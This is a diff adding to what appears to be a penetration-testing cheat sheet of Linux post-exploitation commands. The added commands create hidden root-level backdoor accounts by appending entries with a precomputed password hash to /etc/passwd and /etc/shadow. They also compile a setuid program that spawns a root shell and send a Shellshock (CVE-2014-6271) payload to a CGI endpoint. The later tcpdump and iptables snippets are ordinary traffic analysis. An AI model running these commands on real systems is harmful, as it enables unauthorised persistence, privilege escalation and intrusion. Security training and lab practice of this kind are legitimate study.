@@ -59,6 +59,10 @@ ifconfig -a; netstat -antp; arp -e; route -v; route -vn
 ```
 tar -zcf linux_files.tar.gz /etc/* /home/* /root/* /var/www/* /var/log/*
 ```
+Recursive search:
+```
+grep -rnwl '/path/to/somewhere/' -e "pattern"
+```
 
 ## Password Dumping
 ```
@@ -76,10 +80,97 @@ sudo echo "amxuser ALL=(ALL) ALL" >> /etc/sudoers
 /usr/sbin/useradd -p 'openssl passwd -1 amxpass' amxuser 
 ```
 ```
+/usr/sbin/useradd -p 'openssl passwd -1 -salt AbCD4536 amxpass' amxuser 
+```
+```
 echo amxpass | passwd amxuser --stdin
+```
+```
+echo 'amxuser::0:0::/root:/bin/bash' >>/etc/passwd
+su - dummy
+```
+```
+echo 'amxuser:x:0:0:root:/root:/bin/bash' >>/etc/passwd
+echo 'amxuser:$1$ozUCi1Me$rBG3vK5.jZUScy39PSVtM1:14798:0:99999:7:::' >>/etc/shadow
 ```
 
 ## Exploit 
 ```
 echo "int main(void){\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/sh\");\n}" >privsc.c; gcc privsc.c -o privsc
+```
+
+```
+echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}' > setuid.c
+sudo chown root:root /tmp/setuid
+sudo chmod 4755 /tmp/setuid
+```
+
+Shellshock
+```
+curl -H 'User-Agent: () { :; }; echo "CVE-2014-6271 vulnerable" bash -c id' http://$target/cgi-bin/admin.cgi
+```
+## Network
+
+Grep IPs
+```
+grep -oE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"
+```
+
+Using -X to output raw traffic
+```
+tcpdump -nX -r password_cracking_filtered.pcap | grep -A10 GET
+```
+
+Extract IP addresses from pcap
+```
+tcpdump -n -r dump.pcap | awk -F" " '{print $3}' | sort -u | head`
+```
+
+Filter for http requests
+```
+tcpdump -A -s 0 'tcp port 10443 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf>>2)) != 0)' -i eth0
+```
+
+Filter destination host
+```
+tcpdump -n dst host $target -r password_cracking_filtered.pcap
+```
+
+Filter for source host
+```
+tcpdump -n src host $target -r password_cracking_filter
+```
+
+Filter port
+```
+tcpdump -n port 81 -r password_cracking_filtered.pcap
+```
+
+Extract only ACK and PUSH packets
+```
+tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap
+```
+
+Create traffic counter for specific net
+```
+iptables -N subnet_scan
+iptables -A INPUT -d 10.11.1.0/24 -j subnet_scan
+iptables -vL INPUT
+```
+
+Packet and byte counter using iptables
+```
+#!/bin/bash
+
+# Reset counters and iptables rules
+iptables -Z && iptables -F
+
+# Measure incoming traffic from lab machine
+iptables -I INPUT 1 -s 192.168.1.23 -j ACCEPT
+
+# Measure outgoing traffic to lab machine
+iptables -I OUTPUT 1 -d 192.168.1.23 -j ACCEPT
+```
+```
+watch -n 1 iptables -nvL
 ```
